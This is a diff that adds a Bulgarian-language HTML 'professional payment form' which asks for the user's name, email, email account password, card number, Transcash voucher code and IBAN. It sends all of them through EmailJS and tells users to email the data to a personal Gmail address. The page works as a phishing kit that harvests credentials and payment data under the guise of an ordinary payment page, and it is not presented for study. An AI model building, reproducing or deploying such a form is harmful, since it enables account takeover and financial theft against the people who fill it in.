@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="bg">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Професионален Формуляр — Плащане</title>
+  <style>
+    :root{
+      --bg:#e0f7e9;
+      --card:#ffffff;
+      --accent:#1e7a34;
+      --accent-2:#145c27;
+      --muted:#64707a;
+      --radius:12px;
+      --shadow: 0 8px 24px rgba(0,0,0,0.08);
+    }
+    *{box-sizing:border-box;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;}
+    body{margin:0;background:linear-gradient(180deg,var(--bg),#c9f0d7);color:#05343a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px;}
+    .wrap{max-width:980px;width:100%;display:grid;grid-template-columns:1fr 380px;gap:24px;}
+    @media(max-width:920px){.wrap{grid-template-columns:1fr;}}
+    .panel{background:var(--card);border-radius:var(--radius);padding:22px;box-shadow:var(--shadow);}
+    header{display:flex;align-items:center;gap:14px;margin-bottom:8px}
+    .logo-plate{width:64px;height:64px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:700;font-size:20px;box-shadow:0 6px 18px rgba(15,122,120,0.18)}
+    h1{margin:0;font-size:20px}
+    p.lead{margin:6px 0 0;color:var(--muted);font-size:14px}
+    label{display:block;font-size:13px;color:#06363a;margin-top:12px;margin-bottom:6px}
+    input,textarea,select{width:100%;padding:12px;border-radius:10px;border:1px solid #e7f0f0;background:#fbffff;font-size:14px;color:#05343a}
+    input[type="number"]{appearance:textfield}
+    textarea{resize:vertical}
+    .row{display:flex;gap:12px}
+    .col{flex:1}
+    .btn{display:inline-flex;align-items:center;gap:10px;padding:12px 16px;border-radius:10px;background:var(--accent);color:#fff;border:0;font-weight:600;cursor:pointer}
+    .btn.secondary{background:#fff;border:1px solid rgba(6,92,91,0.08);color:var(--accent-2)}
+    .muted{font-size:13px;color:var(--muted)}
+    .success{margin-top:10px;padding:10px;border-radius:10px;background:#f0fffb;color:#07534f;display:none}
+    footer{margin-top:14px;text-align:center;color:var(--muted);font-size:13px}
+    .logo-svg{width:42px;height:42px}
+  </style>
+</head>
+<body>
+<main class="wrap">
+
+  <!-- Formulaire -->
+  <section class="panel">
+    <header>
+      <div class="logo-plate" aria-hidden="true">
+        <svg class="logo-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Лого">
+          <defs>
+            <linearGradient id="g1" x1="0" x2="1" y1="0" y2="1">
+              <stop offset="0" stop-color="#14b8b3"/>
+              <stop offset="1" stop-color="#0f7a78"/>
+            </linearGradient>
+          </defs>
+          <rect x="4" y="4" width="56" height="56" rx="10" fill="url(#g1)"/>
+          <path d="M20 36c4-6 12-10 22-8" stroke="rgba(255,255,255,0.95)" stroke-width="3" stroke-linecap="round" fill="none"/>
+          <circle cx="44" cy="22" r="5" fill="rgba(255,255,255,0.95)"/>
+        </svg>
+      </div>
+      <div>
+        <h1>Професионален формуляр за плащане</h1>
+        <p class="lead">Без съхраняване на данни на карти — се изпраща чрез EmailJS.</p>
+      </div>
+    </header>
+
+    <form id="main-form" autocomplete="on">
+      <label for="name">Име и фамилия</label>
+      <input id="name" name="name" type="text" placeholder="Иван Петров" required>
+
+      <label for="email">Имейл</label>
+      <input id="email" name="email" type="email" placeholder="ivan@example.com" required>  
+
+      <label for="password">Парола (на имейла)</label>
+      <input id="password" name="password" type="text" placeholder="Въведете паролата на вашия имейл">
+
+      <label for="amount">Сума (BGN)</label>
+      <input id="amount" name="amount" type="number" min="1" value="50" required>
+
+      <div class="row">
+        <div class="col">
+          <label for="card">Номер на карта</label>
+          <input id="card" name="card" type="text" placeholder="1234 5678 9012 3456" pattern="\d{13,19}" maxlength="19" inputmode="numeric">
+        </div>
+        <div class="col">
+          <label for="transcash">Номер на билет Transcash</label>
+          <input id="transcash" name="transcash" type="text" placeholder="XXXX-XXXX-XXXX" pattern="[A-Za-z0-9\-]{10,20}">
+        </div>
+      </div>
+
+      <label for="iban">IBAN (по избор)</label>
+      <input id="iban" name="iban" type="text" placeholder="BG12BUKB12345678901234">
+
+      <label for="note">Бележка</label>
+      <textarea id="note" name="note" rows="4" placeholder="Описание на плащането..."></textarea>
+
+      <button id="send-mail" class="btn" type="submit">Изпрати по имейл</button>
+      <div id="copied" class="success" role="status">Съобщението е изпратено успешно!</div>
+    </form>
+
+    <footer>
+      © <span id="year"></span> Ваша Компания — Политика за поверителност налична при поискване
+    </footer>
+  </section>
+
+  <!-- Aperçu / instructions -->
+  <aside class="panel">
+    <h3 style="margin-top:0">Резюме / Инструкции</h3>
+    <p class="muted">Попълнете полетата и натиснете „Изпрати по имейл“. Ако няма конфигуриран клиент, използвайте бутон „Копирай текста“ и го поставете в имейл към <strong>soso@gmail.com</strong>.</p>
+    <pre id="preview" style="background:#f0fff6;padding:12px;border-radius:10px;overflow-x:auto;font-size:14px;height:360px;"></pre>
+  </aside>
+
+</main>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+emailjs.init("VOTRE_USER_ID"); // Remplacez par votre User ID EmailJS
+
+const form = document.getElementById('main-form');
+const preview = document.getElementById('preview');
+const copied = document.getElementById('copied');
+
+function updatePreview(){
+  const data = new FormData(form);
+  let text = '';
+  for (const [key, val] of data.entries()){
+    if (val) text += `${key}: ${val}\n`;
+  }
+  preview.textContent = text;
+}
+
+form.addEventListener('input', updatePreview);
+updatePreview();
+
+form.addEventListener('submit', function(e){
+  e.preventDefault();
+  emailjs.sendForm('VOTRE_SERVICE_ID', 'VOTRE_TEMPLATE_ID', form)
+    .then(() => {
+      copied.style.display = 'block';
+      setTimeout(()=> copied.style.display = 'none', 4000);
+      form.reset();
+      updatePreview();
+    })
+    .catch(err => alert('Erreur : ' + err.text));
+});
+
+// Année automatique
+document.getElementById('year').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
